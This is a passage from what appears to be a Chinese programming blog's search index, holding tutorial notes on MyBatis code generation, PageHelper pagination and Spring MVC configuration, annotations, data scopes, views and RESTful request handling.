数据库的连接信息 --\u0026gt; \u0026lt;jdbcConnection driverClass=\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34; connectionURL=\u0026#34;jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf8\u0026amp;amp;useSSL=false\u0026amp;amp;serverTimezone=UTC\u0026amp;amp;rewriteBatchedStatements=true\u0026#34; userId=\u0026#34;root\u0026#34; password=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;/jdbcConnection\u0026gt; \u0026lt;!-- javaBean的生成策略--\u0026gt; \u0026lt;javaModelGenerator targetPackage=\u0026#34;com.reus.mybatis.pojo\u0026#34; targetProject=\u0026#34;./src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;trimStrings\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaModelGenerator\u0026gt; \u0026lt;!-- SQL映射文件的生成策略 --\u0026gt; \u0026lt;sqlMapGenerator targetPackage=\u0026#34;com.reus.mybatis.mapper\u0026#34; targetProject=\u0026#34;./src/main/resources\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/sqlMapGenerator\u0026gt; \u0026lt;!-- Mapper接口的生成策略 --\u0026gt; \u0026lt;javaClientGenerator type=\u0026#34;XMLMAPPER\u0026#34; targetPackage=\u0026#34;com.reus.mybatis.mapper\u0026#34; targetProject=\u0026#34;./src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaClientGenerator\u0026gt; \u0026lt;!-- 逆向分析的表 --\u0026gt; \u0026lt;!-- tableName设置为*号，可以对应所有表，此时不写domainObjectName --\u0026gt; \u0026lt;!-- domainObjectName属性指定生成出来的实体类的类名 --\u0026gt; \u0026lt;table tableName=\u0026#34;t_emp\u0026#34; domainObjectName=\u0026#34;Emp\u0026#34;/\u0026gt; \u0026lt;table tableName=\u0026#34;t_dept\u0026#34; domainObjectName=\u0026#34;Dept\u0026#34;/\u0026gt; \u0026lt;/context\u0026gt; \u0026lt;/generatorConfiguration\u0026gt; 运行结果\n10 配置分页插件 pom.xml添加依赖\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在MyBatis的核心配置文件（mybatis-config.xml）中配置插件\n1 2 3 4 \u0026lt;plugins\u0026gt; \u0026lt;!--设置分页插件--\u0026gt; \u0026lt;plugin interceptor=\u0026#34;com.github.pagehelper.PageInterceptor\u0026#34;\u0026gt;\u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; 使用\n在查询功能之前使用PageHelper.startPage(int pageNum, int pageSize)开启分页功能 pageNum：当前页的页码 pageSize：每页显示的条数 1 2 3 4 5 6 EmpMapper mapper = sqlSession.getMapper(EmpMapper.class); //访问第一页，每页四条数据 PageHelper.startPage(1,4); List\u0026lt;Emp\u0026gt; emps = mapper.selectByExample(null); emps.forEach(System.out::println); } 在查询获取list集合之后，使用PageInfo\u0026lt;T\u0026gt; pageInfo = new PageInfo\u0026lt;\u0026gt;(List\u0026lt;T\u0026gt; list, intnavigatePages)获取分页相关数据\nlist：分页之后的数据 navigatePages：导航分页的页码数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Test public void testPageHelper() throws IOException { InputStream is = Resources.getResourceAsStream(\u0026#34;mybatis-config.xml\u0026#34;); SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder(); SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is); SqlSession sqlSession = sqlSessionFactory.openSession(true); EmpMapper mapper = sqlSession.getMapper(EmpMapper.class); PageHelper.startPage(1, 4); List\u0026lt;Emp\u0026gt; emps = mapper.selectByExample(null); PageInfo\u0026lt;Emp\u0026gt; page = new PageInfo\u0026lt;\u0026gt;(emps,5); System.out.println(page); } 结果：\n1 2 3 4 5 PageInfo{ pageNum=1, pageSize=4, size=4, startRow=1, endRow=4, total=8, pages=2, list=Page{count=true, pageNum=1, pageSize=4, startRow=0, endRow=4, total=8, pages=2, reasonable=false, pageSizeZero=false} [Emp{eid=1, empName=\u0026#39;admin\u0026#39;, age=22, sex=\u0026#39;男\u0026#39;, email=\u0026#39;456@qq.com\u0026#39;, did=3}, Emp{eid=2, empName=\u0026#39;admin2\u0026#39;, age=22, sex=\u0026#39;男\u0026#39;, email=\u0026#39;456@qq.com\u0026#39;, did=3}, Emp{eid=3, empName=\u0026#39;王五\u0026#39;, age=12, sex=\u0026#39;女\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;, did=3}, Emp{eid=4, empName=\u0026#39;赵六\u0026#39;, age=32, sex=\u0026#39;男\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;, did=1}], prePage=0, nextPage=2, isFirstPage=true, isLastPage=false, hasPreviousPage=false, hasNextPage=true, navigatePages=5, navigateFirstPage=1, navigateLastPage=2, navigatepageNums=[1, 2]} 常用数据 pageNum：当前页的页码 pageSize：每页显示的条数 size：当前页显示的真实条数 total：总记录数 pages：总页数 prePage：上一页的页码 nextPage：下一页的页码 isFirstPage/isLastPage：是否为第一页/最后一页 hasPreviousPage/hasNextPage：是否存在上一页/下一页 navigatePages：导航分页的页码数 navigatepageNums：导航分页的页码，[1,2,3,4,5] ","permalink":"http://www.reus09.top/posts/tech/mybatis/","summary":"MyBatis 这里整理了MyBatis的常见用法 Mybatis 主要对数据库的操作提供了组件 1 环境搭建 导入依赖 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Mybatis核心 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;","title":"Mybatis"},{"content":"Spring-mvc 本篇主要对spring-mvc的知识点进行总结\nMVC的工作流程：\n用户通过视图层发送请求到服务器，在服务器中请求被Controller接收，Controller调用相应的Model层处理请求，处理完毕将结果返回到Controller，Controller再根据请求处理的结果找到相应的View视图，渲染数据后最终响应给浏览器 SpringMVC工作流程\n浏览器发送请求，若请求地址符合前端控制器的url-pattern，该请求就会被前端控制器DispatcherServlet处理。 前端控制器会读取SpringMVC的核心配置文件，通过扫描组件找到控制器，将请求地址和控制器中@RequestMapping注解的value属性值进行匹配 若匹配成功，该注解所标识的控制器方法就是处理请求的方法。处理请求的方法需要返回一个字符串类型的视图名称，该视图名称会被视图解析器解析，加上前缀和后缀组成视图的路径，通过Thymeleaf对视图进行渲染，最终转发到视图所对应页面 转发和重定向区别\nforward（转发）：\n是服务器请求资源,服务器直接访问目标地址的URL,把那个URL的响应内容读取过来,然后把这些内容再发给浏览器.浏览器根本不知道服务器发送的内容从哪里来的,因为这个跳转过程实在服务器实现的，并不是在客户端实现的所以客户端并不知道这个跳转动作，所以它的地址栏还是原来的地址.\nredirect（重定向）：\n是服务端根据逻辑,发送一个状态码,告诉浏览器重新去请求那个地址.所以地址栏显示的是新的URL.\n转发是服务器行为，重定向是客户端行为。\n1 配置环境 相关依赖\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-webmvc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在web.xml里面配置springMVC的组件，还有过滤器， 对SpringMVC的配置文件:web.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;!--配置springMVC的编码过滤器--\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;CharacterEncodingFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.springframework.web.filter.CharacterEncodingFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;encoding\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;UTF-8\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;forceResponseEncoding\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CharacterEncodingFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 --\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;springMVC\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.springframework.web.servlet.DispatcherServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;!-- 通过初始化参数指定SpringMVC配置文件的位置和名称 --\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;!-- contextConfigLocation为固定值 --\u0026gt; \u0026lt;param-name\u0026gt;contextConfigLocation\u0026lt;/param-name\u0026gt; \u0026lt;!-- 使用classpath:表示从类路径查找配置文件，例如maven工程中的src/main/resources --\u0026gt; \u0026lt;param-value\u0026gt;classpath:springMVC.xml\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;!-- 作为框架的核心组件，在启动过程中有大量的初始化操作要做 而这些操作放在第一次请求时才执行会严重影响访问速度 因此需要通过此标签将启动控制DispatcherServlet的初始化时间提前到服务器启动时 --\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;springMVC\u0026lt;/servlet-name\u0026gt; \u0026lt;!-- 设置springMVC的核心控制器所能处理的请求的请求路径 /所匹配的请求可以是/login或.html或.js或.css方式的请求路径 但是/不能匹配.jsp请求路径的请求 --\u0026gt; \u0026lt;url-pattern\u0026gt;/\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 注：\n\u0026lt;url-pattern\u0026gt;标签中使用/和/*的区别：\n/所匹配的请求可以是/login或.html或.js或.css方式的请求路径，但是/不能匹配.jsp请求路径的请求\n因此就可以避免在访问jsp页面时，该请求被DispatcherServlet处理，从而找不到相应的页面\n/*则能够匹配所有请求，例如在使用过滤器时，若需要对所有请求进行过滤，就需要使用/*的写法\nspring-mvc.xml配置文件\n这里是以解析器为thymeleaf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xmlns:mvc=\u0026#34;http://www.springframework.org/schema/mvc\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd\u0026#34;\u0026gt; \u0026lt;!-- 扫描组件--\u0026gt; \u0026lt;context:component-scan base-package=\u0026#34;com.reus.springmvc\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; \u0026lt;!-- 配置Thymeleaf视图解析器 --\u0026gt; \u0026lt;bean id=\u0026#34;viewResolver\u0026#34; class=\u0026#34;org.thymeleaf.spring5.view.ThymeleafViewResolver\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;order\u0026#34; value=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;characterEncoding\u0026#34; value=\u0026#34;UTF-8\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;templateEngine\u0026#34;\u0026gt; \u0026lt;bean class=\u0026#34;org.thymeleaf.spring5.SpringTemplateEngine\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;templateResolver\u0026#34;\u0026gt; \u0026lt;bean class=\u0026#34;org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver\u0026#34;\u0026gt; \u0026lt;!-- 视图前缀 --\u0026gt; \u0026lt;property name=\u0026#34;prefix\u0026#34; value=\u0026#34;/WEB-INF/templates/\u0026#34;/\u0026gt; \u0026lt;!-- 视图后缀 --\u0026gt; \u0026lt;property name=\u0026#34;suffix\u0026#34; value=\u0026#34;.html\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;templateMode\u0026#34; value=\u0026#34;HTML5\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;characterEncoding\u0026#34; value=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;!-- 配置视图控制器 --\u0026gt; \u0026lt;mvc:view-controller path=\u0026#34;/\u0026#34; view-name= \u0026#34;index\u0026#34; \u0026gt;\u0026lt;/mvc:view-controller\u0026gt; \u0026lt;!-- 开放对静态资源的访问--\u0026gt; \u0026lt;mvc:default-servlet-handler/\u0026gt; \u0026lt;!-- 开启 SpringMVC 的 注解驱动 比如RequestMapping --\u0026gt; \u0026lt;mvc:annotation-driven/\u0026gt; \u0026lt;!-- 配置 文件上传解析器 ，将上传的文件封装为MultipartFile--\u0026gt; \u0026lt;bean id= \u0026#34;multipartResolver\u0026#34; class=\u0026#34;org.springframework.web.multipart.commons.CommonsMultipartResolver\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; \u0026lt;!-- 配置拦截器 --\u0026gt; \u0026lt;mvc:interceptors\u0026gt; \u0026lt;!-- \u0026lt;bean class=\u0026#34;com.reus.springmvc.interceptors.FirstInterceptor\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:interceptor\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:mapping path=\u0026#34;/*\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:exclude-mapping path=\u0026#34;/\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;ref bean=\u0026#34;firstInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/mvc:interceptor\u0026gt;--\u0026gt; \u0026lt;ref bean=\u0026#34;firstInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt; \u0026lt;ref bean=\u0026#34;secondInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt; \u0026lt;/mvc:interceptors\u0026gt; \u0026lt;!-- 配置 异常处理 --\u0026gt; \u0026lt;bean class=\u0026#34;org.springframework.web.servlet.handler.SimpleMappingExceptionResolver\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;exceptionMappings\u0026#34;\u0026gt; \u0026lt;props\u0026gt; \u0026lt;prop key=\u0026#34;java.lang.ArithmeticException\u0026#34;\u0026gt;error\u0026lt;/prop\u0026gt; \u0026lt;/props\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!-- 设置将异常信息共享在请求域中--\u0026gt; \u0026lt;property name=\u0026#34;exceptionAttribute\u0026#34; value=\u0026#34;ex\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 2 SpringMVC中常用的标签 2.1 @RequestingMapping RequestingMapping\n@RequestMapping注解的作用就是将请求和处理请求的控制器方法关联起来，建立映射关系。\n@RequestMapping注解的value属性是一个字符串类型的数组，表示该请求映射能够匹配多个请求地址所对应的请求 这个进入可以用在SpringMVC.xml里面用配置的方式代替。\n1 \u0026lt;mvc:view-controller path=\u0026#34;/\u0026#34; view-name= \u0026#34;index\u0026#34; \u0026gt;\u0026lt;/mvc:view-controller\u0026gt; 但是开启这个会导致其他标注的请求映射失效，因此需要开启mvc注解驱动 \u0026lt;mvc:annotation-driven /\u0026gt; @RequestMapping标识一个类：设置映射请求的请求路径的初始信息\n@RequestMapping标识一个方法：设置映射请求请求路径的具体信息\n1 2 3 4 5 6 7 8 9 10 @Controller @RequestMapping(\u0026#34;/test\u0026#34;) public class RequestMappingController { //此时请求映射所映射的请求的请求路径为：/test/testRequestMapping @RequestMapping(\u0026#34;/testRequestMapping\u0026#34;) public String testRequestMapping(){ return \u0026#34;success\u0026#34;; } } @RequestMapping注解的method属性通过请求的请求方式（get或post）匹配请求映射\n@RequestMapping注解的method属性是一个RequestMethod类型的数组，表示该请求映射能够匹配多种请求方式的请求\n若当前请求的请求地址满足请求映射的value属性，但是请求方式不满足method属性，则浏览器报错405：Request method 'POST' not supported\n@RequestMapping注解的params属性通过请求的请求参数匹配请求映射\n@RequestMapping注解的params属性是一个字符串类型的数组，可以通过四种表达式设置请求参数和请求映射的匹配关系\n\u0026quot;param\u0026quot;：要求请求映射所匹配的请求必须携带param请求参数 \u0026quot;!param\u0026quot;：要求请求映射所匹配的请求必须不能携带param请求参数 \u0026quot;param=value\u0026quot;：要求请求映射所匹配的请求必须携带param请求参数且param=value \u0026quot;param!=value\u0026quot;：要求请求映射所匹配的请求必须携带param请求参数但是param!=value SpringMVC支持ant风格的路径\n？：表示任意的单个字符\n*：表示任意的0个或多个字符\n**：表示任意的一层或多层目录\n只能使用/**/xxx的方式 RequestMapping占位符的作用\nSpringMVC路径中的占位符常用于RESTful风格中，当请求路径中将某些数据通过路径的方式传输到服务器中，就可以在相应的@RequestMapping注解的value属性中通过占位符{xxx}表示传输的数据，在通过@PathVariable注解，将占位符所表示的数据赋值给控制器方法的形参\n1 2 3 4 5 6 @RequestMapping(\u0026#34;/testRest/{id}/{username}\u0026#34;) public String testRest(@PathVariable(\u0026#34;id\u0026#34;) String id, @PathVariable(\u0026#34;username\u0026#34;) String username){ System.out.println(\u0026#34;id:\u0026#34;+id+\u0026#34;,username:\u0026#34;+username); return \u0026#34;success\u0026#34;; } //最终输出的内容为--\u0026gt;id:1,username:admin 2.2 @RequestParam @RequestParam是将请求参数和控制器方法的形参创建映射关系 @RequestParam注解一共有三个属性： value：指定为形参赋值的请求参数的参数名 required：设置是否必须传输此请求参数，默认值为true 若设置为true时，则当前请求必须传输value所指定的请求参数，若没有传输该请求参数，且没有设置defaultValue属性，则页面报错400：Required String parameter 'xxx' is not present；若设置为false，则当前请求不是必须传输value所指定的请求参数，若没有传输，则注解所标识的形参的值为null defaultValue：不管required属性值为true或false，当value所指定的请求参数没有传输或传输的值为\u0026quot;\u0026ldquo;时，则使用默认值为形参赋值 作用实际就是指定需要传入的参数并获取。 2.3 @RequestHeader @RequestHeader是将请求头信息和控制器方法的形参创建映射关系 @RequestHeader注解一共有三个属性：value、required、defaultValue，用法同@RequestParam 获取请求头的信息 2.4 @CookieValue @CookieValue是将cookie数据和控制器方法的形参创建映射关系 @CookieValue注解一共有三个属性：value、required、defaultValue，用法同@RequestParam 作用为获取cookie的信息。 2.5@RequestBody @RequestBody可以获取请求体，需要在控制器方法设置一个形参，使用@RequestBody进行标识，当前请求的请求体就会为当前注解所标识的形参赋值\n即获取传输过来的请求体部分 1 2 3 4 5 6 // 比如传输的 username=admin password=123456 @RequestMapping(\u0026#34;/testRequestBody\u0026#34;) public String testRequestBody(@RequestBody String requestBody){ System.out.println(\u0026#34;requestBody:\u0026#34;+requestBody); return \u0026#34;success\u0026#34;; } 则输出结果为：requestBody:username=admin\u0026amp;password=123456 RequestEntity封装请求报文的一种类型，需要在控制器方法的形参中设置该类型的形参，当前请求的请求报文就会赋值给该形参，可以通过getHeaders()获取请求头信息，通过getBody()获取请求体信息\n1 2 requestHeader:[host:\u0026#34;localhost:8080\u0026#34;, connection:\u0026#34;keep-alive\u0026#34;, content-length:\u0026#34;27\u0026#34;, cache-control:\u0026#34;max-age=0\u0026#34;, sec-ch-ua:\u0026#34;\u0026#34; Not A;Brand\u0026#34;;v=\u0026#34;99\u0026#34;, \u0026#34;Chromium\u0026#34;;v=\u0026#34;90\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;90\u0026#34;\u0026#34;, sec-ch-ua-mobile:\u0026#34;?0\u0026#34;, upgrade-insecure-requests:\u0026#34;1\u0026#34;, origin:\u0026#34;http://localhost:8080\u0026#34;, user-agent:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\u0026#34;] requestBody:username=admin\u0026amp;password=123 2.6@ResponseBody @ResponseBody用于标识一个控制器方法，可以将该方法的返回值直接作为响应报文的响应体响应到浏览器\n1 2 3 4 5 @RequestMapping(\u0026#34;/testResponseBody\u0026#34;) @ResponseBody public String testResponseBody(){ return \u0026#34;success\u0026#34;; } 结果：浏览器页面显示字符串success 2.7@RestController @RestController注解是springMVC提供的一个复合注解，标识在控制器的类上，就相当于为类添加了@Controller注解，并且为其中的每个方法添加了@ResponseBody注解 3 SpirngMVC获取参数 ServletAPI获取:request.getParameter(\u0026quot;xx\u0026quot;);\n1 2 3 4 5 6 7 @RequestMapping(\u0026#34;/testParam\u0026#34;) public String testParam(HttpServletRequest request){ String username = request.getParameter(\u0026#34;username\u0026#34;); String password = request.getParameter(\u0026#34;password\u0026#34;); System.out.println(\u0026#34;username:\u0026#34;+username+\u0026#34;,password:\u0026#34;+password); return \u0026#34;success\u0026#34;; } 通过控制器方法的形参获取请求参数\n在控制器方法的形参位置，设置和请求参数同名的形参，当浏览器发送请求，匹配到请求映射时，在DispatcherServlet中就会将请求参数赋值给相应的形参\n1 \u0026lt;a th:href=\u0026#34;@{/testParam(username=\u0026#39;admin\u0026#39;,password=123456)}\u0026#34;\u0026gt;测试获取请求参数--\u0026gt;/testParam\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; 1 2 3 4 5 @RequestMapping(\u0026#34;/testParam\u0026#34;) public String testParam(String username, String password){ System.out.println(\u0026#34;username:\u0026#34;+username+\u0026#34;,password:\u0026#34;+password); return \u0026#34;success\u0026#34;; } 如果同名的参数过多，可以将其设置为数组，这样数组内的每一个元素均为数据，如果不设置数组，则字符将传入的数据用,进行分隔\n通过POJO获取请求参数\n在控制器方法的形参位置设置一个实体类类型的形参，此时若浏览器传输的请求参数的参数名和实体类中的属性名一致，那么请求参数就会为此属性赋值\n类User中的属性名对应提交的数据 1 2 3 4 5 6 @RequestMapping(\u0026#34;/testpojo\u0026#34;) public String testPOJO(User user){ System.out.println(user); return \u0026#34;success\u0026#34;; } //最终结果--\u0026gt;User{id=null, username=\u0026#39;张三\u0026#39;, password=\u0026#39;123\u0026#39;, age=23, sex=\u0026#39;男\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;} 解决乱码问题\n可以在web.xml里面注册编码过滤器CharacterEncodingFilter，具体操作详情查看上述的web.xml文件 SpringMVC中处理编码的过滤器一定要配置到其他过滤器之前，否则无效 4 域对象共享数据 4.1 request域 使用ServletAPI向request域对象共享数据\n1 2 3 4 5 @RequestMapping(\u0026#34;/testServletAPI\u0026#34;) public String testServletAPI(HttpServletRequest request){ request.setAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,servletAPI\u0026#34;); return \u0026#34;success\u0026#34;; } 使用ModelAndView向request域对象共享数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @RequestMapping(\u0026#34;/testModelAndView\u0026#34;) public ModelAndView testModelAndView(){ /** * ModelAndView有Model和View的功能 * Model主要用于向请求域共享数据 * View主要用于设置视图，实现页面跳转 */ ModelAndView mav = new ModelAndView(); //向请求域共享数据 mav.addObject(\u0026#34;testScope\u0026#34;, \u0026#34;hello,ModelAndView\u0026#34;); //设置视图，实现页面跳转 mav.setViewName(\u0026#34;success\u0026#34;); return mav; } 使用Model向request域对象共享数据\nmodel方式用的比较多 1 2 3 4 5 @RequestMapping(\u0026#34;/testModel\u0026#34;) public String testModel(Model model){ model.addAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,Model\u0026#34;); return \u0026#34;success\u0026#34;; } 使用map向request域对象共享数据\n1 2 3 4 5 @RequestMapping(\u0026#34;/testMap\u0026#34;) public String testMap(Map\u0026lt;String, Object\u0026gt; map){ map.put(\u0026#34;testScope\u0026#34;, \u0026#34;hello,Map\u0026#34;); return \u0026#34;success\u0026#34;; } 使用ModelMap向request域对象共享数据\n1 2 3 4 5 @RequestMapping(\u0026#34;/testModelMap\u0026#34;) public String testModelMap(ModelMap modelMap){ modelMap.addAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,ModelMap\u0026#34;); return \u0026#34;success\u0026#34;; } Model、ModelMap、Map的关系\n1 2 3 4 public interface Model{} public class ModelMap extends LinkedHashMap\u0026lt;String, Object\u0026gt; {} public class ExtendedModelMap extends ModelMap implements Model {} public class BindingAwareModelMap extends ExtendedModelMap {} 4.2 session域 直接使用HttpSession\n1 2 3 4 5 @RequestMapping(\u0026#34;/testSession\u0026#34;) public String testSession(HttpSession session){ session.setAttribute(\u0026#34;testSessionScope\u0026#34;, \u0026#34;hello,session\u0026#34;); return \u0026#34;success\u0026#34;; } 4.3 application域 通过ServletContext application = session.getServletContext();来添加对应的数据\n1 2 3 4 5 6 @RequestMapping(\u0026#34;/testApplication\u0026#34;) public String testApplication(HttpSession session){ ServletContext application = session.getServletContext(); application.setAttribute(\u0026#34;testApplicationScope\u0026#34;, \u0026#34;hello,application\u0026#34;); return \u0026#34;success\u0026#34;; } 5 视图 SpringMVC中的视图是View接口，视图的作用渲染数据，将模型Model中的数据展示给用户\nSpringMVC视图的种类很多，默认有转发视图和重定向视图\n视图步骤\n当控制器方法中所设置的视图名称没有任何前缀时，此时的视图名称会被SpringMVC配置文件中所配置的视图解析器解析，视图名称拼接视图前缀和视图后缀所得到的最终路径，会通过转发的方式实现跳转\n这里以thymeleaf为例\n1 2 3 4 @RequestMapping(\u0026#34;/testHello\u0026#34;) public String testHello(){ return \u0026#34;hello\u0026#34;; } 当控制器方法中所设置的视图名称以\u0026quot;forward:\u0026quot;为前缀时，创建InternalResourceView视图，此时的视图名称不会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀\u0026quot;forward:\u0026quot;去掉，剩余部分作为最终路径通过转发的方式实现跳转\n1 2 3 4 @RequestMapping(\u0026#34;/testForward\u0026#34;) public String testForward(){ return \u0026#34;forward:/testHello\u0026#34;; } 当控制器方法中所设置的视图名称以\u0026quot;redirect:\u0026quot;为前缀时，创建RedirectView视图，此时的视图名称不会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀\u0026quot;redirect:\u0026quot;去掉，剩余部分作为最终路径通过重定向的方式实现跳转\n1 2 3 4 @RequestMapping(\u0026#34;/testRedirect\u0026#34;) public String testRedirect(){ return \u0026#34;redirect:/testHello\u0026#34;; } 6 Restful 它们分别对应四种基本操作：GET 用来获取资源，POST 用来新建资源，PUT 用来更新资源，DELETE 用来删除资源。\nREST 风格提倡 URL 地址使用统一的风格设计，从前到后各个单词使用斜杠分开，不使用问号键值对方式携带请求参数，而是将要发送给服务器的数据作为 URL 地址的一部分，以保证整体风格的一致性。\n操作 传统方式 REST风格 查询操作 getUserById?id=1 user/1\u0026ndash;\u0026gt;get请求方式 保存操作 saveUser user\u0026ndash;\u0026gt;post请求方式 删除操作 deleteUser?id=1 user/1\u0026ndash;\u0026gt;delete请求方式 更新操作 updateUser user\u0026ndash;\u0026gt;put请求方式 SpringMVC给予解决方案\nSpringMVC 提供了 HiddenHttpMethodFilter 帮助我们将 POST 请求转换为 DELETE 或 PUT 请求\n当前请求的请求方式必须为post 当前请求必须传输请求参数_method 在web.xml里面找注册\n1 2 3 4 5 6 7 8 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;HiddenHttpMethodFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.springframework.web.filter.HiddenHttpMethodFilter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;HiddenHttpMethodFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 对应提交过来的请求中应该包含参数\n参数名：_method value:PUT or DELETE 传输的请求方式必须为POST 7 文件上传下载 文件下载\n使用ResponseEntity实现下载文件的功能\n1 2 3 4 5 6 